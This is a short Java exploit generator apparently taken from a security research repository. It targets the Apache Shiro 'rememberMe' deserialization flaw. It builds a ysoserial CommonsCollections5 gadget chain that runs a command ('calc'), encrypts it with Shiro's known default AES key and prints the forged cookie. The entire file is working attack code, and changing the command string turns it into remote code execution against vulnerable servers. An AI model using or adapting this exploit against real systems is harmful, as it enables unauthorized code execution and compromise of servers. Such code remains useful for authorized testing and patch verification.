package org.chabug.shiro;

import org.chabug.util.EncryptUtil;
import org.chabug.util.Serializables;
import ysoserial.payloads.CommonsCollections5;

public class Shiro550 {
    public static void main(String[] args) throws Exception {
        CommonsCollections5 cc = new CommonsCollections5();
        Object calc = cc.getObject("calc");
        byte[] bytes = Serializables.serializeToBytes(calc);
        String key = "kPH+bIxk5D2deZiIxcaaaA==";
        String rememberMe = EncryptUtil.shiroEncrypt(key, bytes);
        System.out.println(rememberMe);
    }
}
